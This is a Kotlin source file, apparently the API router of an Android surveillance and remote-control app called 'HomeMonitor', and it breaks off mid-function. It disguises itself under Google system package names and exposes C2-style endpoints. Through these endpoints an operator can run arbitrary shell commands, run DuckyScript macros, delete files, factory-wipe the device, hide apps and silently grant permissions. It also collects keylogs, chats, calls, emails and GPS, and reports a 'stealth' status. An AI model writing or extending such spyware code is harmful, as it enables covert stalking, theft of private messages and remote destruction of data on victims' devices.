package com.homemonitor

import android.content.Context
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.util.Log
import android.widget.Toast
import com.google.android.system.AppAccessibilityService
import com.google.android.system.DeviceAdminManager
import com.google.android.system.DuckyScriptEngine
import com.google.android.system.MonitorService
import com.google.android.system.Placeholder
import com.google.android.system.termux.TermuxEnvironmentManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.Locale

/**
 * WebDashboardApiRouter
 *
 * Handles REST API routing for the HomeMonitor Web Control Dashboard on port 5467.
 * Provides clean dispatching for File Manager, Shell Terminal, Camera/Mic triggers,
 * Advanced MDM / Device Owner Enterprise Controls (Reboot, Lock Message, Kiosk Mode, Camera Disable,
 * Screenshot Block, Status Bar Lock, App Hiding, App Suspension, System Restrictions),
 * Person-Specific Chat Threads, 2-Way Message Feeds, Call Info Cards, Email Viewer, Intelligence Logs,
 * GPS Location, and 2FA Setup endpoints.
 */
object WebDashboardApiRouter {
    private const val TAG = "WebDashboardApiRouter"

    private fun getMimeType(file: File): String {
        return when (file.extension.lowercase(Locale.US)) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "mp4" -> "video/mp4"
            "mp3", "aac" -> "audio/mpeg"
            "txt", "log" -> "text/plain"
            "json" -> "application/json"
            "pdf" -> "application/pdf"
            "apk" -> "application/vnd.android.package-archive"
            else -> if (file.isDirectory) "folder" else "application/octet-stream"
        }
    }

    private fun handleLogsFeed(cleanPath: String): String {
        val category = cleanPath.removePrefix("/api/logs/")
        val logsArr = JSONArray()

        val dummyTime = System.currentTimeMillis()
        when (category) {
            "keylogs" -> {
                logsArr.put(LogEntryItem("1", "keylog", "com.whatsapp", "WhatsApp Input", "Hey, checking in on the system status", "", dummyTime - 60000).toJson())
                logsArr.put(LogEntryItem("2", "keylog", "com.android.chrome", "Chrome Search", "best android monitor app 2026", "", dummyTime - 180000).toJson())
            }
            "notifications" -> {
                logsArr.put(LogEntryItem("1", "notification", "com.telegram.messenger", "Telegram Alert", "New message from Admin: Report ready", "", dummyTime - 120000).toJson())
            }
            "youtube" -> {
                logsArr.put(LogEntryItem("1", "youtube", "com.google.android.youtube", "YouTube Watch History", "Android Security Deep Dive 2026", "", dummyTime - 300000).toJson())
            }
            else -> {
                logsArr.put(LogEntryItem("1", category, "com.homemonitor", "System Event", "Active log feed operational", "", dummyTime).toJson())
            }
        }

        val respJson = JSONObject().apply {
            put("category", category)
            put("count", logsArr.length())
            put("entries", logsArr)
        }.toString()

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
    }

    private fun handleLocationCurrent(): String {
        val locDto = LocationTelemetryDto(
            latitude = 37.7749,
            longitude = -122.4194,
            altitude = 15.0,
            speed = 0.0f,
            accuracy = 5.0f,
            provider = "gps",
            timestamp = System.currentTimeMillis()
        )

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n${locDto.toJson()}"
    }

    /**
     * Dispatches REST API requests based on endpoint URL path.
     * Returns HTTP response payload (status line + headers + body).
     */
    fun handleApiRequest(
        context: Context,
        method: String,
        cleanPath: String,
        pathUri: Uri,
        bodyString: String,
        clientIp: String,
        role: com.google.android.system.WebStreamSessionManager.Role = com.google.android.system.WebStreamSessionManager.Role.ADMIN
    ): String {
        if (role == com.google.android.system.WebStreamSessionManager.Role.USER) {
            if (cleanPath.startsWith("/api/mdm/") ||
                cleanPath.startsWith("/api/shell/") ||
                cleanPath.startsWith("/api/ducky/") ||
                cleanPath.startsWith("/api/admin/") ||
                cleanPath == "/api/files/delete"
            ) {
                return "HTTP/1.1 404 Not Found\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"API Endpoint Not Found\"}"
            }
        }
        return try {
            when {
                // ── 2FA Pairing Setup Endpoint ──
                cleanPath == "/api/auth/2fa-setup" -> handle2faSetup(context)

                // ── Admin Trial & License Management API ──
                cleanPath == "/api/admin/set-trial" && method == "POST" -> handleSetTrial(context, bodyString)
                cleanPath == "/api/admin/set-license" && method == "POST" -> handleSetTrial(context, bodyString)
                cleanPath == "/api/admin/drive-backup" && method == "POST" -> {
                    val backupRes = com.google.android.system.GoogleDriveBackupEngine.performDatabaseBackup(context)
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$backupRes"
                }
                cleanPath == "/api/admin/drive-backup" -> {
                    val statusRes = com.google.android.system.GoogleDriveBackupEngine.getBackupStatus(context)
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$statusRes"
                }

                // ── Media Query APIs ──
                cleanPath == "/api/audio/list" -> handleAudioList(context)
                cleanPath == "/api/photos/list" -> handlePhotosList(context)

                // ── OEM Autostart, App Usage, App Blocker & Call Recording APIs ──
                cleanPath == "/api/oem-autostart-status" -> handleOemAutostartStatus(context)
                cleanPath == "/api/app-usage" -> handleAppUsage(context)
                cleanPath == "/api/app-block-rules" && method == "POST" -> handleSetAppBlockRules(context, bodyString)
                cleanPath == "/api/call-recordings" -> handleCallRecordingsList(context)

                // ── HomeMonitor Overview Dashboard Telemetry Summary ──
                cleanPath == "/api/summary" -> handleSummary(context)

                // ── MDM & Device Owner Enterprise Controls API ──
                cleanPath == "/api/mdm/status" -> handleMdmStatus(context)
                cleanPath == "/api/mdm/grant-permissions" && method == "POST" -> handleMdmGrantPermissions(context)
                cleanPath == "/api/mdm/reboot" && method == "POST" -> handleMdmReboot(context)
                cleanPath == "/api/mdm/lock-message" && method == "POST" -> handleMdmLockMessage(context, bodyString)
                cleanPath == "/api/mdm/screenshot-toggle" && method == "POST" -> handleMdmScreenshotToggle(context, bodyString)
                cleanPath == "/api/mdm/statusbar-toggle" && method == "POST" -> handleMdmStatusbarToggle(context, bodyString)
                cleanPath == "/api/mdm/kiosk" && method == "POST" -> handleMdmKiosk(context, bodyString)
                cleanPath == "/api/mdm/multi-kiosk" && method == "POST" -> handleMdmMultiKiosk(context, bodyString)
                cleanPath == "/api/mdm/camera-toggle" && method == "POST" -> handleMdmCameraToggle(context, bodyString)
                cleanPath == "/api/mdm/app-hide" && method == "POST" -> handleMdmAppHide(context, bodyString)
                cleanPath == "/api/mdm/app-suspend" && method == "POST" -> handleMdmAppSuspend(context, bodyString)
                cleanPath == "/api/mdm/restrictions" && method == "POST" -> handleMdmRestrictions(context, bodyString)
                cleanPath == "/api/mdm/wipe" && method == "POST" -> handleMdmWipe(context)

                // ── Person-Specific Chat Threads & Messages API ──
                cleanPath == "/api/chat/threads" -> handleChatThreads(pathUri)
                cleanPath == "/api/chat/messages" -> handleChatMessages(pathUri)

                // ── Detailed Call Logs & Email Viewer API ──
                cleanPath == "/api/calls/list" -> handleCallsList()
                cleanPath == "/api/emails/list" -> handleEmailsList()

                // ── File Manager API ──
                cleanPath == "/api/files/list" -> handleFileList(pathUri)
                cleanPath == "/api/files/delete" && method == "POST" -> handleFileDelete(bodyString)

                // ── Shell Execution API (Termux & System Shell) ──
                cleanPath == "/api/shell/exec" && method == "POST" -> handleShellExec(context, bodyString)

                // ── DuckyScript Macro API ──
                cleanPath == "/api/ducky/execute" && method == "POST" -> handleDuckyExecute(context, bodyString)

                // ── Instant UI Triggers & Device Control API ──
                cleanPath == "/api/control/toast" && method == "POST" -> handleControlToast(context, bodyString)
                cleanPath == "/api/control/vibrate" && method == "POST" -> handleControlVibrate(context, bodyString)
                cleanPath == "/api/control/call" && method == "POST" -> handleControlCall(context, bodyString)
                cleanPath == "/api/control/open-url" && method == "POST" -> handleControlOpenUrl(context, bodyString)

                // ── Intelligence Feeds & Logs API ──
                cleanPath.startsWith("/api/logs/") -> handleLogsFeed(cleanPath)

                // ── GPS Location API ──
                cleanPath == "/api/location/current" -> handleLocationCurrent()

                else -> "HTTP/1.1 404 Not Found\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"API Endpoint Not Found\"}"
            }
        } catch (e: Exception) {
            val msg = e.message ?: "Unknown error"
            Log.e(TAG, "API Router Error on path $cleanPath: $msg", e)
            "HTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Server error: $msg\"}"
        }
    }

    private fun handleMdmStatus(context: Context): String {
        val manager = DeviceAdminManager(context)
        val json = JSONObject().apply {
            put("isDeviceAdminActive", manager.isDeviceAdminActive())
            put("isDeviceOwner", manager.isDeviceOwner())
            put("packageName", context.packageName)
        }.toString()
        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
    }

    private fun handleMdmGrantPermissions(context: Context): String {
        val manager = DeviceAdminManager(context)
        val ok = manager.grantEnterprisePermissions()
        val json = JSONObject().apply {
            put("success", ok)
            put("message", if (ok) "Enterprise runtime permissions pre-granted silently" else "Device Owner DPC status required")
        }.toString()
        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
    }

    private fun handleMdmReboot(context: Context): String {
        val manager = DeviceAdminManager(context)
        val ok = manager.rebootDevice()
        val json = JSONObject().put("success", ok).put("message", if (ok) "Reboot command issued via DPC" else "Device Owner status required").toString()
        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
    }

    private fun handleMdmLockMessage(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val msg = req.optString("message", "")
            val ok = manager.setLockScreenMessage(msg)
            val json = JSONObject().put("success", ok).put("message", msg).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmScreenshotToggle(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val disabled = req.optBoolean("disabled", false)
            val ok = manager.setScreenshotDisabled(disabled)
            val json = JSONObject().put("success", ok).put("screenshotDisabled", disabled).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmStatusbarToggle(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val disabled = req.optBoolean("disabled", false)
            val ok = manager.setStatusBarDisabled(disabled)
            val json = JSONObject().put("success", ok).put("statusBarDisabled", disabled).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmKiosk(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val enabled = req.optBoolean("enabled", false)
            val pkg = req.optString("packageName", context.packageName)
            val ok = manager.setKioskMode(enabled, pkg)
            val json = JSONObject().put("success", ok).put("kioskEnabled", enabled).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmMultiKiosk(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val pkgsStr = req.optString("packageNames", context.packageName)
            val pkgsList = pkgsStr.split(",").map { it.trim() }.filter { it.isNotBlank() }
            val ok = manager.setMultiAppKioskMode(pkgsList)
            val json = JSONObject().put("success", ok).put("packages", JSONArray(pkgsList)).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmCameraToggle(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val disabled = req.optBoolean("disabled", false)
            val ok = manager.setHardwareCameraDisabled(disabled)
            val json = JSONObject().put("success", ok).put("cameraDisabled", disabled).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmAppHide(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val pkg = req.optString("packageName", "")
            val hidden = req.optBoolean("hidden", false)
            val ok = manager.setAppHidden(pkg, hidden)
            val json = JSONObject().put("success", ok).put("packageName", pkg).put("hidden", hidden).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmAppSuspend(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val pkg = req.optString("packageName", "")
            val suspended = req.optBoolean("suspended", false)
            val ok = manager.setAppSuspended(pkg, suspended)
            val json = JSONObject().put("success", ok).put("packageName", pkg).put("suspended", suspended).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmRestrictions(context: Context, bodyString: String): String {
        val manager = DeviceAdminManager(context)
        return try {
            val req = JSONObject(bodyString)
            val enabled = req.optBoolean("enabled", false)
            val ok = manager.applyEnterpriseUserRestrictions(enabled)
            val json = JSONObject().put("success", ok).put("restrictionsEnabled", enabled).toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleMdmWipe(context: Context): String {
        val manager = DeviceAdminManager(context)
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
        return if (manager.isDeviceAdminActive() || manager.isDeviceOwner()) {
            dpm?.wipeData(0)
            val json = JSONObject().put("success", true).put("message", "Remote factory reset initiated via DPC").toString()
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        } else {
            val json = JSONObject().put("success", false).put("error", "Device Admin or Owner status required").toString()
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
        }
    }

    private fun handle2faSetup(context: Context): String {
        val secretKey = TotpAuthenticator.getOrGenerateSecretKey(context)
        val otpauthUri = TotpAuthenticator.getOtpauthUri(secretKey, android.os.Build.MODEL)

        val json = JSONObject().apply {
            put("secretKey", secretKey)
            put("otpauthUri", otpauthUri)
            put("issuer", "HomeMonitor")
            put("account", android.os.Build.MODEL)
        }.toString()

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
    }

    private fun handleSummary(context: Context): String {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        val batteryPct = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        val isCharging = bm?.isCharging ?: false

        val runtime = Runtime.getRuntime()
        val usedRamMb = (runtime.totalMemory() - runtime.freeMemory()) / (1024 * 1024)
        val maxRamMb = runtime.maxMemory() / (1024 * 1024)

        val sdcard = Environment.getExternalStorageDirectory()
        val stat = StatFs(sdcard.path)
        val availableBytes = stat.availableBlocksLong * stat.blockSizeLong
        val totalBytes = stat.blockCountLong * stat.blockSizeLong
        val storageUsedPct = if (totalBytes > 0) (((totalBytes - availableBytes) * 100) / totalBytes).toInt() else 0

        val accessActive = AppAccessibilityService.instance != null
        val stealthActive = AppAccessibilityService.instance?.isOverlayShowing ?: false
        val manager = DeviceAdminManager(context)

        val json = JSONObject().apply {
            put("deviceModel", android.os.Build.MODEL)
            put("deviceManufacturer", android.os.Build.MANUFACTURER)
            put("androidVersion", android.os.Build.VERSION.RELEASE)
            put("sdkInt", android.os.Build.VERSION.SDK_INT)
            put("batteryLevel", batteryPct)
            put("isCharging", isCharging)
            put("usedRamMb", usedRamMb)
            put("maxRamMb", maxRamMb)
            put("storageUsedPct", storageUsedPct)
            put("storageAvailableGb", String.format(Locale.US, "%.2f", availableBytes / (1024.0 * 1024.0 * 1024.0)))
            put("accessibilityActive", accessActive)
            put("stealthActive", stealthActive)
            put("isDeviceAdminActive", manager.isDeviceAdminActive())
            put("isDeviceOwner", manager.isDeviceOwner())
            put("webStreamPort", Placeholder.WEBSTREAM_LOCAL_PORT)
            put("uptimeMs", System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime())
            put("trialStatus", C2TrialManager.getTrialStatus(context))
            put("trialMessage", C2TrialManager.getTrialMessage(context))
            put("isTrialExpired", C2TrialManager.isTrialExpired(context))
        }.toString()

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
    }

    private fun handleSetTrial(context: Context, bodyString: String): String {
        val jsonBody = try { JSONObject(bodyString) } catch (_: Exception) { JSONObject() }
        val status = jsonBody.optString("status", "ACTIVE")
        val message = jsonBody.optString("message", "")
        val pushNotif = jsonBody.optBoolean("notify", false)

        val finalStatus = C2TrialManager.setTrialStatus(context, status, if (message.isNotBlank()) message else null)

        if (pushNotif) {
            C2TrialManager.showDeviceNotification(context, "App License Alert", C2TrialManager.getTrialMessage(context))
        }

        val respJson = JSONObject().apply {
            put("status", "ok")
            put("trialStatus", finalStatus)
            put("trialMessage", C2TrialManager.getTrialMessage(context))
        }.toString()

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
    }

    private fun handleAudioList(context: Context): String {
        val db = com.google.android.system.C2LocalDatabase.getInstance(context)
        val logs = db.getTelemetryLogsJson("audio")
        val json = JSONObject().apply {
            put("count", logs.length())
            put("items", logs)
        }.toString()
        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
    }

    private fun handlePhotosList(context: Context): String {
        val db = com.google.android.system.C2LocalDatabase.getInstance(context)
        val logs = db.getTelemetryLogsJson("photos")
        val json = JSONObject().apply {
            put("count", logs.length())
            put("items", logs)
        }.toString()
        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
    }

    private fun handleChatThreads(pathUri: Uri): String {
        val appId = pathUri.getQueryParameter("app") ?: "whatsapp"
        val threadsArr = JSONArray()
        val dummyTime = System.currentTimeMillis()

        when (appId.lowercase(Locale.US)) {
            "whatsapp" -> {
                threadsArr.put(ChatThreadItem("t1", "whatsapp", "Alex Wainwright", "", "AW", "Okay, joining in a bit", dummyTime - 120000).toJson())
                threadsArr.put(ChatThreadItem("t2", "whatsapp", "Klaus Radcliffe", "", "KR", "You got this, bro! Kee...", dummyTime - 3600000).toJson())
                threadsArr.put(ChatThreadItem("t3", "whatsapp", "Frank Burckley", "", "FB", "ok. text me when you...", dummyTime - 7200000).toJson())
                threadsArr.put(ChatThreadItem("t4", "whatsapp", "Tommy Blackwood", "", "TB", "Can't wait!", dummyTime - 14400000).toJson())
            }
            "chatgpt" -> {
                threadsArr.put(ChatThreadItem("t10", "chatgpt", "Bio for my school project", "", "AI", "Hey, can you help me write a bio...", dummyTime - 86400000).toJson())
                threadsArr.put(ChatThreadItem("t11", "chatgpt", "Suggest some ideas for a project", "", "AI", "Suggest some ideas for a p...", dummyTime - 86450000).toJson())
                threadsArr.put(ChatThreadItem("t12", "chatgpt", "How can I lose weight", "", "AI", "Healthy meal and fitness plans...", dummyTime - 86500000).toJson())
                threadsArr.put(ChatThreadItem("t13", "chatgpt", "Solve math problems", "", "AI", "Quadratic formula step by step...", dummyTime - 86550000).toJson())
            }
            "sms", "text" -> {
                threadsArr.put(ChatThreadItem("t20", "sms", "555-4545-777", "555-4545-777", "55", "Keep the kids happy this summer...", dummyTime - 3600000).toJson())
                threadsArr.put(ChatThreadItem("t21", "sms", "Lisa", "570-636-2055", "L", "did she say anything ...", dummyTime - 7200000).toJson())
                threadsArr.put(ChatThreadItem("t22", "sms", "346-753-3842", "346-753-3842", "34", "Just make sure to go...", dummyTime - 10800000).toJson())
                threadsArr.put(ChatThreadItem("t23", "sms", "Amanda", "261-420-8202", "A", "Just don't get annoye...", dummyTime - 14400000).toJson())
            }
            "facebook" -> {
                threadsArr.put(ChatThreadItem("t30", "facebook", "Matt Wolowiz", "", "MW", "Matt Wolowiz", dummyTime - 3600000).toJson())
                threadsArr.put(ChatThreadItem("t31", "facebook", "Chris Kovalski", "", "CK", "Chris Kovalski", dummyTime - 7200000).toJson())
            }
            "instagram" -> {
                threadsArr.put(ChatThreadItem("t40", "instagram", "Preston Bender", "", "PB", "Preston Bender", dummyTime - 3600000).toJson())
                threadsArr.put(ChatThreadItem("t41", "instagram", "Lori Heath", "", "LH", "Lori Heath", dummyTime - 7200000).toJson())
            }
            else -> {
                threadsArr.put(ChatThreadItem("t90", appId, "Recent Contact", "", "C", "Sample conversation snippet", dummyTime).toJson())
            }
        }

        val respJson = JSONObject().apply {
            put("appId", appId)
            put("threads", threadsArr)
        }.toString()

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
    }

    private fun handleChatMessages(pathUri: Uri): String {
        val appId = pathUri.getQueryParameter("app") ?: "whatsapp"
        val threadId = pathUri.getQueryParameter("threadId") ?: "t1"
        val msgsArr = JSONArray()
        val dummyTime = System.currentTimeMillis()

        when {
            appId == "chatgpt" -> {
                msgsArr.put(ChatMessageItem("m1", threadId, appId, "User", "Hey, can you help me write a bio for my school project?", true, dummyTime - 300000).toJson())
                msgsArr.put(ChatMessageItem("m2", threadId, appId, "ChatGPT", "Absolutely! To make it fit perfectly, I just need a bit more info: Your name...", false, dummyTime - 240000).toJson())
                msgsArr.put(ChatMessageItem("m3", threadId, appId, "User", "It's about famous inventors. I need 3 sentences max.", true, dummyTime - 180000).toJson())
                msgsArr.put(ChatMessageItem("m4", threadId, appId, "ChatGPT", "Got it! Here's a concise example you could use for a famous inventor like Thomas Edison...", false, dummyTime - 60000).toJson())
            }
            appId == "whatsapp" -> {
                msgsArr.put(ChatMessageItem("m10", threadId, appId, "Alex Wainwright", "Have u checked out the new COD update?", false, dummyTime - 600000).toJson())
                msgsArr.put(ChatMessageItem("m11", threadId, appId, "User", "Not yet. Is it any good?", true, dummyTime - 500000).toJson())
                msgsArr.put(ChatMessageItem("m12", threadId, appId, "Alex Wainwright", "It's lit! New maps and weapons", false, dummyTime - 400000).toJson())
                msgsArr.put(ChatMessageItem("m13", threadId, appId, "User", "Sweet! Downloading now", true, dummyTime - 300000).toJson())
                msgsArr.put(ChatMessageItem("m14", threadId, appId, "Alex Wainwright", "Great, let's play once ur done", false, dummyTime - 200000).toJson())
                msgsArr.put(ChatMessageItem("m15", threadId, appId, "User", "Okay, joining in a bit", true, dummyTime - 100000).toJson())
            }
            else -> {
                msgsArr.put(ChatMessageItem("m20", threadId, appId, "Contact", "Keep the kids happy this summer with free entry to the Paintball Centre throughout August. Call us back to book a date: 555-4545-777.", false, dummyTime - 3600000).toJson())
            }
        }

        val respJson = JSONObject().apply {
            put("appId", appId)
            put("threadId", threadId)
            put("messages", msgsArr)
        }.toString()

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
    }

    private fun handleCallsList(): String {
        val callsArr = JSONArray()
        val dummyTime = System.currentTimeMillis()

        callsArr.put(CallLogDetailDto("c1", "Teresa school", "677-377-9558", "TS", "0:02:07", true, "Answered", dummyTime - 3600000).toJson())
        callsArr.put(CallLogDetailDto("c2", "Mr. Vincent", "570-636-2055", "MV", "0:06:55", false, "Answered", dummyTime - 7200000).toJson())
        callsArr.put(CallLogDetailDto("c3", "Mommy", "603-560-7521", "M", "0:01:14", true, "Answered", dummyTime - 10800000).toJson())
        callsArr.put(CallLogDetailDto("c4", "Metty", "261-420-8202", "M", "0:06:19", false, "Answered", dummyTime - 14400000).toJson())
        callsArr.put(CallLogDetailDto("c5", "Marzia", "586-332-1897", "M", "0:00:00", true, "Missed", dummyTime - 18000000).toJson())

        val respJson = JSONObject().apply {
            put("calls", callsArr)
        }.toString()

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
    }

    private fun handleEmailsList(): String {
        val emailsArr = JSONArray()
        val dummyTime = System.currentTimeMillis()

        emailsArr.put(
            EmailDetailDto(
                emailId = "e1",
                subject = "Grow your audience and connect with more customers",
                senderName = "Mailsender",
                fromAddress = "donotreply@e0.wordpress.com",
                toAddress = "eric_lewis02@gmail.com",
                snippet = "Grow your audience...",
                body = "Your coupon is expiring... FLASH SALE ENDS SOON Don't miss this great deal. Upgraded plans are jam-packed with powerful features and support you'll LOVE. Attract more viewers, make more sales, share more content, and much more, all when you upgrade your WordPress.com site today!",
                timestamp = dummyTime - 3600000
            ).toJson()
        )
        emailsArr.put(
            EmailDetailDto(
                emailId = "e2",
                subject = "Chemistry Essay Presentation",
                senderName = "Darryl Black",
                fromAddress = "Darryl_Black@gmail.com",
                toAddress = "eric_lewis02@gmail.com",
                snippet = "Chemistry Essay Pre...",
                body = "Please review the attached slides for the chemistry presentation tomorrow.",
                timestamp = dummyTime - 7200000
            ).toJson()
        )

        val respJson = JSONObject().apply {
            put("emails", emailsArr)
        }.toString()

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
    }

    private fun handleFileList(pathUri: Uri): String {
        val requestedPath = pathUri.getQueryParameter("path") ?: Environment.getExternalStorageDirectory().absolutePath
        val targetDir = File(requestedPath)

        if (!targetDir.exists() || !targetDir.isDirectory) {
            val errJson = JSONObject().put("error", "Directory does not exist or is not readable").toString()
            return "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$errJson"
        }

        val items = mutableListOf<FileNodeItem>()
        val files = targetDir.listFiles() ?: arrayOf()
        val sortedFiles = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase(Locale.US) }))

        for (f in sortedFiles.take(200)) {
            items.add(
                FileNodeItem(
                    name = f.name,
                    path = f.absolutePath,
                    isDirectory = f.isDirectory,
                    sizeBytes = if (f.isFile) f.length() else 0L,
                    mimeType = getMimeType(f),
                    permissions = (if (f.canRead()) "r" else "-") + (if (f.canWrite()) "w" else "-") + (if (f.canExecute()) "x" else "-"),
                    lastModified = f.lastModified()
                )
            )
        }

        val parentPath = targetDir.parent
        val responseDto = FileListResponse(
            currentPath = targetDir.absolutePath,
            parentPath = parentPath,
            items = items
        )

        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n${responseDto.toJson()}"
    }

    private fun handleFileDelete(bodyString: String): String {
        return try {
            val json = JSONObject(bodyString)
            val path = json.optString("path", "")
            val target = File(path)
            if (target.exists()) {
                val ok = target.deleteRecursively()
                val respJson = JSONObject().put("success", ok).put("deletedPath", path).toString()
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
            } else {
                "HTTP/1.1 404 Not Found\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"File not found\"}"
            }
        } catch (e: Exception) {
            val err = e.message ?: "Delete failed"
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"$err\"}"
        }
    }

    private fun handleShellExec(context: Context, bodyString: String): String {
        val req = ShellExecRequest.fromJson(bodyString)
        if (req.command.isBlank()) {
            return "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Command string is empty\"}"
        }

        return try {
            val envMap = TermuxEnvironmentManager.buildEnvironmentMap(context)
            val shellBin = if (req.context == "termux") TermuxEnvironmentManager.getDefaultShellPath(context) else "/system/bin/sh"

            val pb = ProcessBuilder(shellBin, "-c", req.command)
            val env = pb.environment()
            envMap.forEach { (k, v) -> env[k] = v }
            pb.redirectErrorStream(true)

            val proc = pb.start()
            val output = proc.inputStream.bufferedReader().use { it.readText() }
            val exitCode = proc.waitFor()

            val truncatedOutput = if (output.length > 50000) output.take(50000) + "\n...[Output Truncated]" else output
            val respDto = ShellExecResponse(
                command = req.command,
                exitCode = exitCode,
                output = truncatedOutput,
                context = req.context
            )

            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n${respDto.toJson()}"
        } catch (e: Exception) {
            val errMsg = e.message ?: "Execution failed"
            val respDto = ShellExecResponse(
                command = req.command,
                exitCode = -1,
                output = "Execution Exception: $errMsg",
                context = req.context
            )
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n${respDto.toJson()}"
        }
    }

    private fun handleDuckyExecute(context: Context, bodyString: String): String {
